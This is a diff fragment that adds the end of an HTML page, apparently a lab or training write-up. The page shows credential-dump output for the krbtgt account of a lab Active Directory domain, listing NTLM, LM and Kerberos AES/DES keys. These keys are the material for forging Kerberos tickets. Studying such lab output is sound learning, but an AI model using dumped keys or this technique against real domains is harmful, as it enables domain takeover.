+<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">502</span>
+
+<span class="n">Credentials</span><span class="p">:</span>
+  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">4e9815869d2090ccfca61c1fe0d23986</span>
+    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">4e9815869d2090ccfca61c1fe0d23986</span>
+    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">ea03581a1268674a828bde6ab09db837</span>
+
+<span class="n">Supplemental</span> <span class="n">Credentials</span><span class="p">:</span>
+<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">NTLM-Strong-NTOWF</span> <span class="p">*</span>
+    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="n">6d4cc4edd46d8c3d3e59250c91eac2bd</span>
+
+<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos-Newer-Keys</span> <span class="p">*</span>
+    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
+    <span class="k">Default</span> <span class="n">Iterations</span> <span class="p">:</span> <span class="n">4096</span>
+    <span class="n">Credentials</span>
+      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span>
+      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">e74fa5a9aa05b2c0b2d196e226d8820e</span>
+      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">150ea2e934ab6b80</span>
+
+<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span> <span class="p">*</span>
+    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
+    <span class="n">Credentials</span>
+      <span class="n">des_cbc_md5</span>       <span class="p">:</span> <span class="n">150ea2e934ab6b80</span>
+</code></pre></div>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
